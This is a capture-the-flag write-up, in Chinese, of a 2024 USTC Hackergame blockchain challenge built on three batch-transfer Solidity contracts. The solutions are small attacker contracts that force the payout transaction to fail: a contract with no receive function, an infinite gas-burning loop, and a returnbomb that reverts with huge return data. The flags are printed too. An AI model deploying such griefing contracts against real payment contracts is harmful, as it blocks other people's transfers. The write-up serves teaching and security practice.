---
title: Blockchain - 链上转账助手
description: 2024 | 中国科学技术大学第十一届信息安全大赛 | General
tags:
    - smart contract
    - gas griefing
    - returnbomb attack
---

## 题目

??? note "main.py"

    ```py
    from web3 import Web3
    from web3.middleware import geth_poa_middleware
    import os
    import json
    import time

    challenge_id = int(input('The challenge you want to play (1 or 2 or 3): '))
    assert challenge_id == 1 or challenge_id == 2 or challenge_id == 3

    player_bytecode = bytes.fromhex(input('Player bytecode: '))

    print('Launching anvil...')
    os.system('anvil --silent --disable-console-log --ipc /dev/shm/eth.ipc &')
    time.sleep(2)
    w3 = Web3(Web3.IPCProvider('/dev/shm/eth.ipc'))
    w3.middleware_onion.inject(geth_poa_middleware, layer=0)
    privatekey = '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80' # anvil default private key
    acct = w3.eth.account.from_key(privatekey)

    print('Deploying challenge contract...')
    bytecode, abi = json.load(open(f'contract{challenge_id}.json'))
    Challenge = w3.eth.contract(abi=abi, bytecode=bytecode)
    nonce = w3.eth.get_transaction_count(acct.address)
    tx = Challenge.constructor().build_transaction({'nonce': nonce, 'from': acct.address})
    signed_tx = w3.eth.account.sign_transaction(tx, private_key=privatekey)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    assert tx_receipt.status
    print('Challenge contract address:', tx_receipt.contractAddress)
    challenge = w3.eth.contract(address=tx_receipt.contractAddress, abi=abi)

    print('Deploying player contract...')
    recipients = []
    for i in range(10):
        nonce = w3.eth.get_transaction_count(acct.address)
        tx = {'to': None, 'data': player_bytecode, 'nonce': nonce, 'from': acct.address, 'gasPrice': w3.eth.gas_price, 'gas': 1000000}
        signed_tx = w3.eth.account.sign_transaction(tx, private_key=privatekey)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
        tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        if not tx_receipt.status:
            print('Failed deploying player contract')
            exit(-1)
        recipients.append(tx_receipt.contractAddress)

    amounts = [w3.to_wei(1, 'ether')] * 10
    nonce = w3.eth.get_transaction_count(acct.address)
    tx = challenge.functions.batchTransfer(recipients, amounts).build_transaction({'nonce': nonce, 'from': acct.address, 'value': sum(amounts), 'gas': 1000000})
    signed_tx = w3.eth.account.sign_transaction(tx, private_key=privatekey)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    if tx_receipt.status:
        print('Transfer success, no flag.')
        exit(-1)

    print(open(f'flag{challenge_id}').read())
    ```

??? note "challenge1.sol"

    ```js
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    contract BatchTransfer {
        function batchTransfer(address payable[] calldata recipients, uint256[] calldata amounts) external payable {
            require(recipients.length == amounts.length, "Recipients and amounts length mismatch");

            uint256 totalAmount = 0;
            uint256 i;

            for (i = 0; i < amounts.length; i++) {
                totalAmount += amounts[i];
            }

            require(totalAmount == msg.value, "Incorrect total amount");

            for (i = 0; i < recipients.length; i++) {
                recipients[i].transfer(amounts[i]);
            }
        }
    }
    ```

??? note "challenge2.sol"

    ```js
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    contract BatchTransfer {
        mapping(address => uint256) public pendingWithdrawals;

        function batchTransfer(address payable[] calldata recipients, uint256[] calldata amounts) external payable {
            require(recipients.length == amounts.length, "Recipients and amounts length mismatch");

            uint256 totalAmount = 0;
            uint256 i;

            for (i = 0; i < amounts.length; i++) {
                totalAmount += amounts[i];
            }

            require(totalAmount == msg.value, "Incorrect total amount");

            for (i = 0; i < recipients.length; i++) {
                (bool success, ) = recipients[i].call{value: amounts[i]}("");
                if (!success) {
                    pendingWithdrawals[recipients[i]] += amounts[i];
                }
            }
        }

        function withdrawPending() external {
            uint256 amount = pendingWithdrawals[msg.sender];
            pendingWithdrawals[msg.sender] = 0;
            (bool success, ) = payable(msg.sender).call{value: amount}("");
            require(success, "Withdrawal failed");
        }
    }
    ```

??? note "challenge3.sol"

    ```js
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    contract BatchTransfer {
        mapping(address => uint256) public pendingWithdrawals;

        function batchTransfer(address payable[] calldata recipients, uint256[] calldata amounts) external payable {
            require(recipients.length == amounts.length, "Recipients and amounts length mismatch");

            uint256 totalAmount = 0;
            uint256 i;

            for (i = 0; i < amounts.length; i++) {
                totalAmount += amounts[i];
            }

            require(totalAmount == msg.value, "Incorrect total amount");

            for (i = 0; i < recipients.length; i++) {
                (bool success, ) = recipients[i].call{value: amounts[i], gas: 10000}("");
                if (!success) {
                    pendingWithdrawals[recipients[i]] += amounts[i];
                }
            }
        }

        function withdrawPending() external {
            uint256 amount = pendingWithdrawals[msg.sender];
            pendingWithdrawals[msg.sender] = 0;
            (bool success, ) = payable(msg.sender).call{value: amount}("");
            require(success, "Withdrawal failed");
        }
    }
    ```

## 解题思路

- 每题会根据玩家提供的字节码部署十个合约并作为 `BatchTransfer::batchTransfer()` 的接收者，随后执行转账交易
- 若调用 `batchTransfer()` 函数的交易执行失败即可获得 Flag

### Challenge 1

- 本题使用 `transfer` 进行转账，转账失败会报错导致交易回滚
- 一个没有 `receive()` 或 `fallback()` 函数的合约即可 :3

```js
contract Empty {}
```

#### Flag

> flag{Tr4nsf3r_T0_c0nTracT_MaY_R3v3rt}

### Challenge 2

- 本题将 `transfer()` 改为 `call()`，如果转账失败则将金额记录到 `pendingWithdrawals` 映射中
- 根据 Challenge 3 的修改容易想到可以通过死循环耗尽交易的 gas

```js
contract Loop {
    receive() external payable {
        while (true) {}
    }
}
```

#### Flag

> flag{Ple4se_L1m1t_y0uR_GAS_HaHa}

### Challenge 3

- 本题限制了每次 `call()` 的 gas 消耗为 1 万，而 `batchTransfer()` 交易的 gas limit 为 100 万
- 需要让内部交易尽可能地影响主交易，一个方式是返回大量字节
- Solidity 的低级调用会将返回的所有数据拷贝到内存中，而内存扩容（以字为单位）会增加 gas 消耗

    <pre>
    <code>mem_size_words = (mem_size + 31) // 32
    gas_cost = (mem_size_words ^ 2 // 512) + (3 * mem_size_words) - C<sub>men</sub>(old_state)</code></pre>

- 使用 `revert` 返回数据能够通过读写状态变量消耗更多的 gas，不过本题 `return` 就足够了

```js
contract HugeReturn {
    receive() external payable {
        assembly {
            revert(0, 55000)
        }
    }
}
```

#### Flag

> flag{Y0u_4re_Th3_M4sTeR_0f_EVM!!!}

## 参考资料

- [Appendix - Dynamic Gas Costs](https://github.com/wolflo/evm-opcodes/blob/main/gas.md)
- [nomad-xyz / ExcessivelySafeCall](https://github.com/nomad-xyz/ExcessivelySafeCall)
